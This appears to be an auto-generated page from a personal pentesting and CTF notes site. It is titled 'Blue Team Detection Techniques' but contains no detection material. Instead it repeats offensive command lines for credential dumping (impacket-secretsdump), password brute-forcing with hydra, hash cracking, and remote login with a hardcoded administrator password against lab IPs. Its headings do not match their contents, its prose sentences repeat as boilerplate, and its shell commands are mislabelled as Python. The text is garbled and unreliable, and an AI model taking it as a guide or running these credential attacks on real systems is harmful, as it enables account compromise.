---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, windows, oscp, malware, lateral movement"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-667.html"
URL_IMAGES: ""
Date: "2024-08-14"
Tags: "DFIR, Windows, OSCP, Malware, Lateral Movement"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-667"
Permalink: "/notes/note-blue-team-detection-techniques-667.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Redis

### smbexec

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```python
gobuster dir -u http://10.110.72.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.17.4.53
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.23.88.70 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.228.188
```

The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

## NFS No Root Squash

### Bash

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service.

```bash
crackmapexec smb 10.112.75.28 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.34.246.199/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- `socat`
- `enum4linux`
- `nmap`

```powershell
evil-winrm -i 10.123.176.33 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.88.121.230 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.23.74.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.93.103.171 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

> **Note:** LXD Privilege Escalation was identified as the primary attack vector in this scenario.

## Pass the Hash

### AlwaysInstallElevated

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.78.13.229 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.87.63.24
```

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.89.204.233 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## evil-winrm

### SeImpersonatePrivilege

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

The kernel version was outdated and vulnerable to a publicly known exploit. Token impersonation allowed elevation to SYSTEM privileges on the target.

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

- `netcat`
- `atexec`
- `rpcclient`
